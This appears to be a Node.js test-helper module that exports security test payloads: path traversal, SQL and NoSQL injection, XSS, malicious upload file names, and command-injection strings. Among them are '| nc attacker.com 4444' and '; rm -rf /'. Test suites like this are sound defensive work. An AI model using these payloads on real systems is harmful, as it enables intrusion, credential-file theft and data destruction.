/**
 * Security Test Helpers
 * Provides payloads and utilities for testing security vulnerabilities
 */

/**
 * Path traversal payloads for testing
 */
const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '....//....//etc/passwd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '/etc/passwd',
  'C:\\Windows\\System32\\config\\sam',
  '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
  '%2e%2e%2f',
  '..%2f',
  '%2e%2e%2f',
  '..%c0%af',
  '..%c1%9c',
];

/**
 * SQL injection payloads for testing
 */
const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin'--",
  "admin'/*",
  "' UNION SELECT NULL--",
  "1' OR '1'='1",
  "1' UNION SELECT * FROM users--",
  "'; DROP TABLE articles; --",
  "' OR 1=1--",
  "' OR 'a'='a",
  "') OR ('1'='1",
  "1' AND '1'='1",
  "1' AND '1'='2",
  "1' AND 1=1--",
  "1' AND 1=2--",
];

/**
 * XSS payloads for testing
 */
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<keygen onfocus=alert("XSS") autofocus>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '<marquee onstart=alert("XSS")>',
  '<div onmouseover=alert("XSS")>',
  '<style>@import\'javascript:alert("XSS")\';</style>',
  '<link rel=stylesheet href=javascript:alert("XSS")>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
  '<form><button formaction="javascript:alert(\'XSS\')">CLICK',
  '<isindex type=submit formaction=javascript:alert("XSS")>',
  '<math><mi//xlink:href="jAvAsCrIpT:alert(\'XSS\')">CLICKME</mi>',
  '<math><mi//xlink:href="data:text/html,<script>alert(\'XSS\')</script>">',
  '<math><annotation-xml encoding="text/html"><script>alert("XSS")</script></annotation-xml>',
  '<math><mi xlink:href="javascript:alert(\'XSS\')">CLICKME</mi>',
];

/**
 * Command injection payloads
 */
const commandInjectionPayloads = [
  '; ls -la',
  '| cat /etc/passwd',
  '&& whoami',
  '`whoami`',
  '$(whoami)',
  '; cat /etc/passwd',
  '| nc attacker.com 4444',
  '; rm -rf /',
  '&& cat /etc/passwd',
];

/**
 * NoSQL injection payloads
 */
const nosqlInjectionPayloads = [
  { $ne: null },
  { $gt: '' },
  { $regex: '.*' },
  { $where: 'this.username == this.password' },
  { $or: [{ username: 'admin' }, { password: 'admin' }] },
];

/**
 * File upload malicious payloads
 */
const maliciousFilePayloads = {
  // Files with executable extensions
  executableExtensions: ['.exe', '.sh', '.bat', '.cmd', '.ps1', '.php', '.jsp', '.asp'],
  
  // Files with double extensions
  doubleExtensions: ['file.php.jpg', 'file.exe.png', 'file.sh.txt'],
  
  // Files with null bytes
  nullByteInjection: ['file.php%00.jpg', 'file.exe%00.png'],
  
  // Files with special characters
  specialCharacters: ['file<script>.jpg', 'file<img src=x>.png'],
  
  // Files that exceed size limits
  oversizedFiles: true, // Will be generated dynamically
};

/**
 * Generate CSRF token (mock implementation for testing)
 */
function generateCSRFToken() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

/**
 * Create a malicious file buffer for testing
 */
function createMaliciousFileBuffer(content = '<script>alert("XSS")</script>') {
  return Buffer.from(content, 'utf8');
}

/**
 * Create a test file with malicious content
 */
function createMaliciousTestFile(filename, content) {
  return {
    fieldname: 'file',
    originalname: filename,
    encoding: '7bit',
    mimetype: 'text/plain',
    buffer: Buffer.from(content),
    size: Buffer.from(content).length
  };
}

/**
 * Generate oversized file buffer (for testing file size limits)
 */
function createOversizedFileBuffer(sizeInMB = 10) {
  const size = sizeInMB * 1024 * 1024; // Convert MB to bytes
  return Buffer.alloc(size, 'A');
}

/**
 * Encode payload for URL encoding
 */
function urlEncode(payload) {
  return encodeURIComponent(payload);
}

/**
 * Encode payload for double URL encoding
 */
function doubleUrlEncode(payload) {
  return encodeURIComponent(encodeURIComponent(payload));
}

/**
 * Create SQL injection test query
 */
function createSQLInjectionQuery(field, payload) {
  return {
    [field]: payload,
  };
}

/**
 * Create XSS test payload in different contexts
 */
const xssContexts = {
  html: '<script>alert("XSS")</script>',
  attribute: '" onmouseover="alert(\'XSS\')"',
  javascript: "';alert('XSS');//",
  url: 'javascript:alert("XSS")',
  css: 'expression(alert("XSS"))',
};

module.exports = {
  pathTraversalPayloads,
  sqlInjectionPayloads,
  xssPayloads,
  commandInjectionPayloads,
  nosqlInjectionPayloads,
  maliciousFilePayloads,
  generateCSRFToken,
  createMaliciousFileBuffer,
  createMaliciousTestFile,
  createOversizedFileBuffer,
  urlEncode,
  doubleUrlEncode,
  createSQLInjectionQuery,
  xssContexts,
};

